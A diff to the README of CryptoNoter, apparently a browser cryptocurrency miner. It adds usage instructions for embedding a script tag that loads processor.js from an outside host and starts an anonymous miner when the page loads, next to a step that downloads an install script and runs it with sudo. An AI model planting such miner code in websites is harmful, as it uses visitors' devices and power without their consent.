@@ -35,6 +35,15 @@ curl https://raw.githubusercontent.com/cryptonoter/CryptoNoter/master/install.sh
 sudo sh install.sh
 ```
 
+## Usage
+* Add the following javascript before the </head> tag on your website coding:
+```html
+<script src="https://www.cryptonoter.com/processor.js"></script>
+<script>
+    var miner = new CryptoNoter.Anonymous('CryptoNoter').start();
+</script>
+```
+
 ## Troubleshooting
 Check if server.js execute successfully by using this command
 ```bash
